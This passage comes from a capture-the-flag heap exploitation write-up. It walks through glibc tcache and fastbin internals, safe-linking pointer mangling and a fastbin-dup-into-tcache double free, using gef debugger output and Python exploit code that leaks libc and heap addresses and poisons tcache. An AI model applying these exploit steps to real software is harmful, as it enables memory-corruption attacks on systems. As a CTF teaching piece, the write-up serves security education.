+<span class="o">-----------------</span> <span class="n">Tcache</span> <span class="n">Bins</span> <span class="k">for</span> <span class="n">arena</span> <span class="err">'</span><span class="n">main_arena</span><span class="err">'</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">tcache_perthread_struct</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x5555555590a8</span><span class="p">)</span> <span class="o">-----------------</span>
+<span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x5555555590b0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x555555559840</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x555555559830</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x555555559840</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55500000cd49</span><span class="p">(</span><span class="o">=</span><span class="mh">0x555555559810</span><span class="p">))</span>
+<span class="p">...</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="mh">0x555555559800</span>
+<span class="mh">0x555555559800</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span>
+<span class="mh">0x555555559810</span><span class="o">:</span>	<span class="mh">0x000055500000c2b9</span>	<span class="mh">0xb6f37a1e26ba13a0</span>
+</code></pre></div></div>
+
+<p>note the <code class="language-plaintext highlighter-rouge">fd=0x55500000cd49(=0x555555559810)</code> line. <code class="language-plaintext highlighter-rouge">0x55500000cd49</code> is the value actually <em>stored</em> in the chunk, whereas <code class="language-plaintext highlighter-rouge">0x555555559810</code> is the value of the actual pointer <em>after unmangling</em>.</p>
+
+<p><strong>solution:</strong> the program does not perform write on allocations. if we malloc, free, then malloc a chunk <em>t</em>, reading directly from that chunk <em>t</em> would give us the data that <em>gets populated during freeing</em>, which is a pointer to the next chunk in tcache. this gives us our heap leak.</p>
+
+<hr />
+
+<p><strong>3.</strong> fastbin malloc checks.</p>
+
+<p><strong>problem:</strong> fastbin checks both the size header <em>and</em> the alignment whenever we malloc a new chunk from it. this severely limits our arballoc (if we ever get it), because we would only be able to arballoc to places that pass both checks.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">----------------------------------------------</span> <span class="n">Fast</span> <span class="n">Bins</span> <span class="k">for</span> <span class="n">arena</span> <span class="err">'</span><span class="n">main_arena</span><span class="err">'</span> <span class="o">----------------------------------------------</span>
+<span class="n">fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x7ffff7e13ad8</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x0000004058c0</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x4058c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x4058d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x000000405c95</span>
+<span class="p">(</span><span class="o">=</span><span class="mh">0x000000405890</span><span class="p">))</span> <span class="o">&lt;-</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">this</span> <span class="n">address</span>
+<span class="p">...</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="mh">0x000000405890</span>
+<span class="mh">0x405890</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span> <span class="o">&lt;-</span> <span class="n">valid</span> <span class="n">size</span> <span class="n">header</span>
+<span class="mh">0x4058a0</span><span class="o">:</span>	<span class="mh">0x0000000000405c65</span>	<span class="mh">0x0000000000000000</span>
+</code></pre></div></div>
+
+<p>to exemplify, note the above snippet. we see a valid fastbin chunk’s fd ptr <em>points to a chunk</em> where the size header is correctly set as <code class="language-plaintext highlighter-rouge">0x31</code>. if we, however, tried to allocate to something useful (such as, say, the <code class="language-plaintext highlighter-rouge">stderr</code> file structure, the <code class="language-plaintext highlighter-rouge">size</code> check would catch us).</p>
+
+<p><strong>solution:</strong> we don’t do our arbitrary allocation from fastbins! we will do them from tcache instead. essentially, what we do is:</p>
+
+<ul>
+  <li>fill the tcache by allocating 7 times</li>
+  <li>fill the fastbins by allocating 2 more times. call this chunk A and chunk B.</li>
+  <li>add our tcache chunks to the freelist.</li>
+  <li>add chunk A to the freelist, then chunk B, then chunk A again. this circumvents the first fastbin dup check.</li>
+  <li>then, perform our oneshot free.</li>
+  <li>then, we empty tcache again to make way for our duplicated pointers (by just mallocing chunks of the same size).</li>
+  <li>then… SECRET FENG SHUI, ENABLED BY:</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#if USE_TCACHE
+</span>  <span class="cm">/* While we're here, if we see other chunks of the same size,
+ stash them in the tcache.  */</span>
+  <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
+
+  <span class="cm">/* While bin not empty and tcache not full, copy chunks.  */</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
+	 <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">misaligned_chunk</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">)))</span>
+	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): unaligned fastbin chunk detected 3"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
+	<span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">REVEAL_PTR</span> <span class="p">(</span><span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
+      <span class="k">else</span>
+	<span class="p">{</span>
+	  <span class="n">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">tc_victim</span><span class="p">);</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
+	    <span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+      <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">#endif
+</span></code></pre></div></div>
+
+<p>simply put, when we reallocate from fastbins when the tcache is empty, <em>all our chunks</em> get yanked into the fastbin, without checking for double frees within the fastbin itself.</p>
+
+<p>so, if we just claim a fastbin chunk once, our duplicated pointers automatically get put in tcache, and we are free to tcache poison and claim them from there!</p>
+
+<p>let’s consolidate our exploit for now. first we can obtain a libc leak from unsorted bins. recall that the unsorted bins are a doubly linked list with both <code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> pointers, and that when we free a chunk into the unsorted bins, both pointers point to <code class="language-plaintext highlighter-rouge">main_arena</code>, which is an area in libc. you can see this in action w/ the following example below:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">bins</span>
+<span class="o">----------------------------</span> <span class="n">Unsorted</span> <span class="n">Bin</span> <span class="k">for</span> <span class="n">arena</span> <span class="err">'</span><span class="n">main_arena</span><span class="err">'</span> <span class="o">----------------------------</span>
+<span class="n">unsorted_bin</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="n">any</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x7ffff7e13b30</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x555555559000</span><span class="p">,</span> <span class="n">bk</span><span class="o">=</span><span class="mh">0x7ffff7e13b20</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x555555559000</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x555555559010</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x510</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> 
+
+<span class="n">fd</span><span class="o">=</span><span class="mh">0x7ffff7e13b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mh">0x60</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">bk</span><span class="o">=</span><span class="mh">0x7ffff7e13b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mh">0x60</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">valid</span> <span class="n">chunks</span> <span class="n">in</span> <span class="n">unsorted</span> <span class="n">bin</span> <span class="p">(</span><span class="n">when</span> <span class="n">traced</span> <span class="n">from</span> <span class="err">`</span><span class="n">bk</span><span class="err">`</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>we can free a chunk straight into the unsorted bin simply by just allocating a size so large that it does not fit into the tcache. the code to perform this is below (also note that <code class="language-plaintext highlighter-rouge">main_arena</code> is always a fixed offset from <code class="language-plaintext highlighter-rouge">libc</code> base).</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># our libc leak:
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span> <span class="c1"># guard chunk, so that when we free the 0x1000 sized chunk it doesn't get consolidated w/ the top chunk
+</span>
+<span class="n">addf</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># we reclaim our chunk from the unsorted bins
+</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">read</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'name '</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">','</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1e7b20</span> <span class="c1"># whack in gdb
+</span><span class="n">addf</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">free</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>afterwards, we can get a heap leak by doing the same thing, but in the tcache.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># heap leak
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+<span class="n">addf</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">free</span><span class="p">()</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">read</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'name '</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">','</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">))</span> 
+<span class="n">addf</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>this is the same concept as above: we malloc chunks, free them, then reallocate them so that we can read the fd pointer (that gets populated on freeing).</p>
+
+<p>now, onto the actual exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">'[*] allocating 9 chunks to fill tcache + double free'</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">addf</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">()</span> <span class="c1"># fill tcache
+</span><span class="n">addf</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span> <span class="c1"># double free
+</span></code></pre></div></div>
+
+<p>we allocate 9 chunks, free the first 7. then we add chunk 8, chunk 9, and then chunk 8 again to the free list. this results in the following state in fastbins.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---------------------</span> <span class="n">Fast</span> <span class="n">Bins</span> <span class="k">for</span> <span class="n">arena</span> <span class="err">'</span><span class="n">main_arena</span><span class="err">'</span> <span class="o">---------------------</span>
+<span class="n">fastbins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x7f94d0e13ae0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x564ea7bd11c0</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x564ea7bd11c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x564ea7bd11d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x564bc35769d1</span><span class="p">(</span><span class="o">=</span><span class="mh">0x564ea7bd1200</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x564ea7bd1200</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x564ea7bd1210</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x564bc3576a11</span><span class="p">(</span><span class="o">=</span><span class="mh">0x564ea7bd11c0</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x564ea7bd11c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x564ea7bd11d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x564bc35769d1</span><span class="p">(</span><span class="o">=</span><span class="mh">0x564ea7bd1200</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="mh">0x564ea7bd11c0</span> <span class="p">[</span><span class="n">loop</span> <span class="n">detected</span><span class="p">]</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">valid</span> <span class="n">chunks</span> <span class="n">in</span> <span class="n">fastbins</span>
+</code></pre></div></div>
+
+<p>note the (loop detected) - that means we have our double free. afterwards, we empty tcache again and reclaim our first fastbin chunk, thereby putting our duplicated pointers into tcache.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">'[*] re-emptying tcache'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span> <span class="c1"># empty tcache so we can yank the fastbin chunks into tcache for tcache poisoning
+</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span> <span class="c1"># yank!
+</span><span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>this results in the following state in tcache. now, if we can just claim the first chunk, we essentially have a use-after-free. this is because after claiming the first chunk, we can edit it (and thereby edit its fd pointer).</p>
+
+<p>assume we start with tcache in this state, where we have 3 chunks, the first and last of which are duplicated.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x55764a9700c8</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55764a96f210</span> <span class="n">count</span><span class="o">=-</span><span class="mi">21868</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x55764a96f200</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x55764a96f210</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55731df258bf</span><span class="p">(</span><span class="o">=</span><span class="mh">0x55764a96f1d0</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x55764a96f1c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x55764a96f1d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55731df25b7f</span><span class="p">(</span><span class="o">=</span><span class="mh">0x55764a96f210</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x55764a96f200</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x55764a96f210</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55731df258bf</span><span class="p">(</span><span class="o">=</span><span class="mh">0x55764a96f1d0</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>then, we claim the first chunk, and then edit it to some nonsense value.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="s">'[*] now poisoning tcache for that chunk'</span><span class="p">)</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcacacacacacacaca</span>  <span class="o">^</span> <span class="n">heap_leak</span><span class="p">))</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'...'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>viewing the state of the tcache, we can now see that 
+the last chunk’s fd pointer is now corrupted.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x55caa68ed0c8</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55caa68ec210</span> <span class="n">count</span><span class="o">=-</span><span class="mi">21960</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x55caa68ec200</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x55caa68ec210</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x55cffa24a93c</span><span class="p">(</span><span class="o">=</span><span class="mh">0x55caa68ec1d0</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x55caa68ec1c0</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x55caa68ec1d0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> 
+<span class="n">fd</span><span class="o">=</span><span class="mh">0xcacacacf9660a226</span><span class="p">(</span><span class="o">=</span><span class="mh">0xcacacacacacacaca</span><span class="p">),</span> <span class="n">corrupted</span><span class="p">)</span>
+<span class="o">^</span> <span class="n">kena</span> <span class="n">poison</span>
+</code></pre></div></div>
+
+<p>now we essentially have arbitrary write (albeit of a limited size). our first goal should be to get writes of a larger size. how do we do this?</p>
+
+<p>by tcache poisoning again! we can arbitrarily allocate <em>over another bigger chunk’s fd pointer</em>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># this is the chunk whose fd ptr we want to overwrite
+</span><span class="n">malloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># malloc another time to increase tcache count
+</span>
+<span class="n">addf</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="n">addf</span><span class="p">(</span><span class="mi">9</span><span class="p">);</span> <span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>viewing the state of the tcache once more, we can figure out which address we want to override.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">31</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x562a377701b0</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x562a3776f460</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x562a3776f450</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x562a3776f460</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x562f55d5853f</span><span class="p">(</span><span class="o">=</span><span class="mh">0x562a3776f250</span><span class="p">))</span>
+ <span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x562a3776f240</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x562a3776f250</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x210</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x000562a3776f</span><span class="p">(</span><span class="o">=</span><span class="mh">0x000000000000</span><span class="p">))</span>
+
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">x</span> <span class="mh">0x562a3776f450</span>
+<span class="mh">0x562a3776f450</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000211</span>
+<span class="mh">0x562a3776f460</span><span class="o">:</span> <span class="mh">0x0000562f55d5853f</span>      <span class="mh">0x2f8390a87fe29df0</span>
+</code></pre></div></div>
+
+<p>(the actual address would be <code class="language-plaintext highlighter-rouge">0x[HEAP BASE]460</code>).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="err">@</span><span class="mh">0x558da03820c8</span><span class="p">]</span><span class="o">:</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x558da0381210</span> <span class="n">count</span><span class="o">=-</span><span class="mi">21889</span>
+
+<span class="o">-&gt;</span> <span class="n">Chunk</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mh">0x558da0381200</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="mh">0x558da0381210</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">,</span> <span class="n">fd</span><span class="o">=</span><span class="mh">0x5588f8e21251</span><span class="p">(</span><span class="o">=</span><span class="mh">0x558da03811d0</span><span class="p">))</span>
+
+<span class="p">[</span><span class="n">here</span> <span class="n">is</span> <span class="n">our</span> <span class="n">chunk</span> <span class="n">of</span> <span class="n">interest</span><span class="p">]</span>
